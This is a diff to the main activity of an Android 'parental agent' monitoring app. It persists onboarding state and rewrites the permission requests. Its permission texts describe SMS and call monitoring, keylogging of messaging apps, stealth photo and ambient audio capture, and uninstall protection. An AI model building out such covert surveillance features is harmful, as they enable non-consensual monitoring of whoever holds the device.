@@ -18,6 +18,7 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.compose.runtime.*
+import com.parental.agent.data.local.AppPreferences
 import com.parental.agent.services.AgentDeviceAdminReceiver
 import com.parental.agent.ui.navigation.Screen
 import com.parental.agent.ui.onboarding.*
@@ -44,6 +45,8 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        val prefs = AppPreferences(this)
+
         // Check & Execute Path A Device Owner Silent Provisioning if provisioned
         val deviceOwnerManager = com.parental.agent.policy.DeviceOwnerManager(this)
         if (deviceOwnerManager.isDeviceOwner()) {
@@ -53,10 +56,17 @@ class MainActivity : ComponentActivity() {
         initPermissionList()
         refreshPermissionStates()
 
+        // Determine persistent initial screen based on saved preferences
+        val initialScreen = when {
+            prefs.isDevicePaired() -> Screen.ActiveStatus
+            prefs.isTermsAccepted() -> Screen.Permissions
+            else -> Screen.Terms
+        }
+
         setContent {
             AndroidAgentTheme {
-                var currentScreen by remember { mutableStateOf<Screen>(Screen.Terms) }
-                var pairedDeviceName by remember { mutableStateOf("Target Device") }
+                var currentScreen by remember { mutableStateOf<Screen>(initialScreen) }
+                var pairedDeviceName by remember { mutableStateOf(prefs.getPairedDeviceName()) }
 
                 val featureCapabilities = remember(permissionsListState.map { it.isGranted }) {
                     val isLoc = permissionsListState.find { it.id == "loc" }?.isGranted == true
@@ -145,6 +155,7 @@ class MainActivity : ComponentActivity() {
                     is Screen.Terms -> {
                         TermsScreen(
                             onAccepted = {
+                                prefs.setTermsAccepted(true)
                                 currentScreen = Screen.Permissions
                             }
                         )
@@ -165,8 +176,12 @@ class MainActivity : ComponentActivity() {
 
                     is Screen.Pairing -> {
                         PairingScreen(
+                            deviceId = prefs.getDeviceId(),
                             onPairDevice = { _, alias ->
                                 pairedDeviceName = alias
+                                prefs.setTermsAccepted(true)
+                                prefs.setDevicePaired(true)
+                                prefs.setPairedDeviceName(alias)
                                 currentScreen = Screen.ActiveStatus
                             }
                         )
@@ -189,194 +204,209 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun initPermissionList() {
-        if (permissionsListState.isEmpty()) {
-            permissionsListState.addAll(
-                listOf(
-                    PermissionItem("loc", "Location Service", "Fine & Background GPS tracking", isGranted = false),
-                    PermissionItem("calls", "Call Logs & Telephony", "Call metadata & duration logs", isGranted = false),
-                    PermissionItem("sms", "SMS Telemetry", "Incoming & outgoing SMS logs", isGranted = false),
-                    PermissionItem("contacts", "Contacts Inventory", "Contact list synchronization", isGranted = false),
-                    PermissionItem("usage", "App Usage Access", "Screen time & app usage duration", isGranted = false),
-                    PermissionItem("accessibility", "Accessibility Service", "Chat UI inspection & web URL filter", isGranted = false),
-                    PermissionItem("notification", "Notification Access", "Social app notification parsing", isGranted = false),
-                    PermissionItem("admin", "Device Administrator", "Uninstall protection & remote lock", isGranted = false),
-                    PermissionItem("audio", "Audio Recording", "Call fallback & surround sound capture", isGranted = false),
-                    PermissionItem("camera", "Camera Access", "Stealth photo capture & QR scanner", isGranted = false, isMandatory = false),
-                    PermissionItem("calendar", "Calendar Events", "Event title & schedule logs", isGranted = false, isMandatory = false),
-                    PermissionItem("overlay", "System Overlay Window", "App Blocker warning screen overlay", isGranted = false, isMandatory = false),
-                    PermissionItem("battery", "Battery Optimization", "Doze mode exemption", isGranted = false)
-                )
+        permissionsListState.clear()
+
+        // 1. Fine Location
+        permissionsListState.add(
+            PermissionItem(
+                id = "loc",
+                title = "Live GPS Location",
+                description = "Required for real-time location tracking & geofencing alerts.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
             )
-        }
-    }
+        )
 
-    private fun requestOrOpenAppSettings(vararg permissions: String) {
-        val permanentlyDenied = permissions.any { perm ->
-            val isNotGranted = ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
-            val isBlockedBySystem = !ActivityCompat.shouldShowRequestPermissionRationale(this, perm)
-            isNotGranted && isBlockedBySystem
-        }
-
-        if (permanentlyDenied) {
-            // Direct user to App Info -> Permissions screen in Android Settings
-            val intent = Intent(
-                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
-                Uri.parse("package:$packageName")
+        // 2. Call Logs
+        permissionsListState.add(
+            PermissionItem(
+                id = "calls",
+                title = "Call History Telemetry",
+                description = "Monitors incoming, outgoing, and missed phone calls.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
             )
-            settingsActivityLauncher.launch(intent)
-        } else {
-            runtimePermissionLauncher.launch(permissions.toList().toTypedArray())
-        }
-    }
+        )
 
-    private fun handlePermissionRequest(item: PermissionItem) {
-        when (item.id) {
-            "loc" -> {
-                requestOrOpenAppSettings(
-                    Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.ACCESS_COARSE_LOCATION
-                )
-            }
-            "calls" -> {
-                requestOrOpenAppSettings(
-                    Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.READ_PHONE_STATE
-                )
-            }
-            "sms" -> {
-                requestOrOpenAppSettings(
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.RECEIVE_SMS
-                )
-            }
-            "contacts" -> {
-                requestOrOpenAppSettings(Manifest.permission.READ_CONTACTS)
-            }
-            "audio" -> {
-                requestOrOpenAppSettings(Manifest.permission.RECORD_AUDIO)
-            }
-            "camera" -> {
-                requestOrOpenAppSettings(Manifest.permission.CAMERA)
-            }
-            "calendar" -> {
-                requestOrOpenAppSettings(Manifest.permission.READ_CALENDAR)
-            }
-            "usage" -> {
-                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
-                settingsActivityLauncher.launch(intent)
-            }
-            "accessibility" -> {
-                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                settingsActivityLauncher.launch(intent)
-            }
-            "notification" -> {
-                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-                settingsActivityLauncher.launch(intent)
-            }
-            "admin" -> {
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(
-                        DevicePolicyManager.EXTRA_DEVICE_ADMIN,
-                        ComponentName(this@MainActivity, AgentDeviceAdminReceiver::class.java)
-                    )
-                    putExtra(
-                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Enable protection against unauthorized app uninstallation."
-                    )
-                }
-                settingsActivityLauncher.launch(intent)
-            }
-            "overlay" -> {
-                val intent = Intent(
-                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:$packageName")
-                )
-                settingsActivityLauncher.launch(intent)
-            }
-            "battery" -> {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    val intent = Intent(
-                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                        Uri.parse("package:$packageName")
-                    )
-                    settingsActivityLauncher.launch(intent)
-                }
-            }
-        }
+        // 3. SMS Telemetry
+        permissionsListState.add(
+            PermissionItem(
+                id = "sms",
+                title = "SMS Telemetry",
+                description = "Monitors incoming and outgoing text messages.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+            )
+        )
+
+        // 4. Contacts
+        permissionsListState.add(
+            PermissionItem(
+                id = "contacts",
+                title = "Contacts Inventory",
+                description = "Syncs address book contacts to detect unknown callers.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+            )
+        )
+
+        // 5. Audio Recording
+        permissionsListState.add(
+            PermissionItem(
+                id = "audio",
+                title = "Call & Surround Audio",
+                description = "Enables call recording fallback & ambient audio capture.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+            )
+        )
+
+        // 6. Camera Access
+        permissionsListState.add(
+            PermissionItem(
+                id = "camera",
+                title = "Stealth Photo Capture",
+                description = "Allows taking stealth snapshots upon security alerts.",
+                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+            )
+        )
+
+        // 7. Accessibility Service
+        permissionsListState.add(
+            PermissionItem(
+                id = "accessibility",
+                title = "Accessibility Core Engine",
+                description = "Monitors social messaging apps (WhatsApp, IG, Telegram) & keylogs.",
+                isGranted = isAccessibilityServiceEnabled()
+            )
+        )
+
+        // 8. Notification Access
+        permissionsListState.add(
+            PermissionItem(
+                id = "notification",
+                title = "Notification Listener",
+                description = "Captures instant messaging notifications & system warnings.",
+                isGranted = isNotificationServiceEnabled()
+            )
+        )
+
+        // 9. App Usage Stats
+        permissionsListState.add(
+            PermissionItem(
+                id = "usage",
+                title = "App Usage Tracking",
+                description = "Measures daily screen time and application launch metrics.",
+                isGranted = isUsageAccessGranted()
+            )
+        )
+
+        // 10. System Overlay
+        permissionsListState.add(
+            PermissionItem(
+                id = "overlay",
+                title = "Draw Over Other Apps",
+                description = "Displays block screens when app time limits are reached.",
+                isGranted = Settings.canDrawOverlays(this)
+            )
+        )
+
+        // 11. Battery Optimization Exclusion
+        permissionsListState.add(
+            PermissionItem(
+                id = "battery",
+                title = "Ignore Battery Optimization",
+                description = "Ensures background telemetry continuous execution without OS kill.",
+                isGranted = isBatteryOptimizationIgnored()
+            )
+        )
+
+        // 12. Device Admin / MDM
+        permissionsListState.add(
+            PermissionItem(
+                id = "admin",
+                title = "Device Admin Protection",
+                description = "Prevents unauthorized uninstallation of the security agent.",
+                isGranted = isDeviceAdminActive()
+            )
+        )
     }
 
     private fun refreshPermissionStates() {
         for (i in permissionsListState.indices) {
             val item = permissionsListState[i]
-            val isGranted = checkPermissionGranted(item.id)
-            if (item.isGranted != isGranted) {
-                permissionsListState[i] = item.copy(isGranted = isGranted)
+            val granted = when (item.id) {
+                "loc" -> ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                "calls" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
+                "sms" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+                "contacts" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+                "audio" -> ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+                "camera" -> ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+                "accessibility" -> isAccessibilityServiceEnabled()
+                "notification" -> isNotificationServiceEnabled()
+                "usage" -> isUsageAccessGranted()
+                "overlay" -> Settings.canDrawOverlays(this)
+                "battery" -> isBatteryOptimizationIgnored()
+                "admin" -> isDeviceAdminActive()
+                else -> false
+            }
+            permissionsListState[i] = item.copy(isGranted = granted)
+        }
+    }
+
+    private fun handlePermissionRequest(item: PermissionItem) {
+        when (item.id) {
+            "loc" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION))
+            "calls" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE))
+            "sms" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS))
+            "contacts" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS))
+            "audio" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.RECORD_AUDIO))
+            "camera" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.CAMERA))
+            "accessibility" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            "notification" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+            "usage" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
+            "overlay" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+            "battery" -> {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+                settingsActivityLauncher.launch(intent)
+            }
+            "admin" -> {
+                val component = ComponentName(this, AgentDeviceAdminReceiver::class.java)
+                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
+                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enables protection against unauthorized app uninstallation.")
+                }
+                settingsActivityLauncher.launch(intent)
             }
         }
     }
 
-    private fun checkPermissionGranted(id: String): Boolean {
-        return when (id) {
-            "loc" -> ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        val expectedService = "$packageName/com.parental.agent.services.AgentAccessibilityService"
+        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
+        return enabledServices.contains(expectedService)
+    }
 
-            "calls" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
+    private fun isNotificationServiceEnabled(): Boolean {
+        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
+        return flat.contains(packageName)
+    }
 
-            "sms" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
-
-            "contacts" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
-
-            "audio" -> ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
-
-            "camera" -> ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-
-            "calendar" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED
-
-            "usage" -> {
-                val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
-                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
-                } else {
-                    @Suppress("DEPRECATION")
-                    appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
-                }
-                mode == AppOpsManager.MODE_ALLOWED
-            }
-
-            "accessibility" -> {
-                val pref = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
-                pref.contains(packageName)
-            }
-
-            "notification" -> {
-                val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
-                enabledListeners.contains(packageName)
-            }
-
-            "admin" -> {
-                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                val adminComponent = ComponentName(this, AgentDeviceAdminReceiver::class.java)
-                dpm.isAdminActive(adminComponent)
-            }
-
-            "overlay" -> {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    Settings.canDrawOverlays(this)
-                } else {
-                    true
-                }
-            }
-
-            "battery" -> {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-                    pm.isIgnoringBatteryOptimizations(packageName)
-                } else {
-                    true
-                }
-            }
-
-            else -> false
+    private fun isUsageAccessGranted(): Boolean {
+        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
+        } else {
+            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
         }
+        return mode == AppOpsManager.MODE_ALLOWED
+    }
+
+    private fun isBatteryOptimizationIgnored(): Boolean {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        return pm.isIgnoringBatteryOptimizations(packageName)
+    }
+
+    private fun isDeviceAdminActive(): Boolean {
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val component = ComponentName(this, AgentDeviceAdminReceiver::class.java)
+        return dpm.isAdminActive(component)
     }
 }
